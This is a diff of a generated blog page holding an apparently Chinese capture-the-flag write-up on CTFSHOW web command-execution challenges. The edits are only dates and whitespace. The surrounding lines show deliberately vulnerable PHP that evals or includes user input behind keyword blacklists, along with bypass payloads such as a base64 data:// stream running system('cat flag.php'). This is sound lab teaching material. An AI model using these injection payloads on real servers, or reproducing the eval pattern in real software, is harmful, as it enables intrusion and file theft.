@@ -513,7 +513,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-08-15
+                    2021-08-24
                 </div>
                 
 
@@ -527,7 +527,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    11 分
+                    10 分
                 </div>
                 
 
@@ -550,7 +550,7 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="CTFSHOW-命令执行合集"><a href="#CTFSHOW-命令执行合集" class="headerlink" title="[CTFSHOW]命令执行合集"></a>[CTFSHOW]命令执行合集</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>来源于</p>
+                <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>来源于</p>
 <p><a target="_blank" rel="noopener" href="https://hellohy.top/huayang/1102.html#respond">【原创】ctfshow—web入门—命令执行 （29-77）（持续更新）</a></p>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/solitudi/article/details/109837640">[CTFSHOW]命令执行</a></p>
 <p>进行归纳总结。</p>
@@ -561,7 +561,7 @@
     <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
         <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token punctuation">&#125;</span>
-    
+
 <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
     <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
@@ -581,7 +581,7 @@ payload7<span class="token punctuation">:</span>c<span class="token operator">=<
     <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag|system|php/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
         <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token punctuation">&#125;</span>
-    
+
 <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
     <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
@@ -594,7 +594,7 @@ payload7<span class="token punctuation">:</span>c<span class="token operator">=<
 <span class="token function">popen</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
 <span class="token function">proc_open</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
 <span class="token function">pcntl_exec</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
-反引号 同<span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+反引号 同<span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <h2 id="Web31-cat-sort-shell"><a href="#Web31-cat-sort-shell" class="headerlink" title="Web31 cat|sort|shell"></a>Web31 cat|sort|shell</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -603,7 +603,7 @@ payload7<span class="token punctuation">:</span>c<span class="token operator">=<
     <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag|system|php|cat|sort|shell|\.| |\'/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
         <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token punctuation">&#125;</span>
-    
+
 <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
     <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
@@ -624,7 +624,7 @@ c<span class="token operator">=</span><span class="token keyword">echo</span><sp
     <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
         <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token punctuation">&#125;</span>
-    
+
 <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
     <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
@@ -655,7 +655,7 @@ c=include$_GET[a]?>&amp;1=data://text/palin,<span class="token php language-php"
         <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
         <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
     <span class="token punctuation">&#125;</span>
-    
+
 <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
     <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
@@ -670,7 +670,7 @@ c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==<span ari
         <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
         <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
     <span class="token punctuation">&#125;</span>
-    
+
 <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
     <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
@@ -684,7 +684,7 @@ c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==<span ari
     <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
         <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">".php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token punctuation">&#125;</span>
-    
+
 <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
     <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
@@ -892,7 +892,7 @@ payload9:c&#x3D;nl%09fla\g.php%26<span aria-hidden="true" class="line-numbers-ro
     <span class="token keyword">if</span> r<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"flag"</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>
         <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
         <span class="token keyword">break</span>
-        
+
 <span class="token comment">#可以考虑加个声明 b'#!/bin/sh\ncat flag.php'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p><strong>Web56</strong>加了[0-9]，同上</p>
@@ -905,7 +905,7 @@ payload9:c&#x3D;nl%09fla\g.php%26<span aria-hidden="true" class="line-numbers-ro
     <span class="token punctuation">&#125;</span>
 <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
     <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>目的是构造36这个数字，利用</p>
 <pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;与网上wp结果不一致，在kali与ubuntu18环境下测试为如下结果
@@ -943,7 +943,7 @@ c<span class="token operator">=</span><span class="token function">highlight_fil
 <blockquote>
 <p>此函数丢弃最顶层输出缓冲区的内容并关闭这个缓冲区。如果想要进一步处理缓冲区的内容，必须在ob_end_clean()之前调用ob_get_contents()，因为当调用ob_end_clean()时缓冲区内容将被丢弃。</p>
 </blockquote>
-<p>所以在缓冲区关闭之前退出程序： </p>
+<p>所以在缓冲区关闭之前退出程序：</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php">c<span class="token operator">=</span><span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <h2 id="Web72-open-basedir-bypass"><a href="#Web72-open-basedir-bypass" class="headerlink" title="Web72 open_basedir bypass"></a>Web72 open_basedir bypass</h2><p><a target="_blank" rel="noopener" href="https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php">参考链接</a></p>
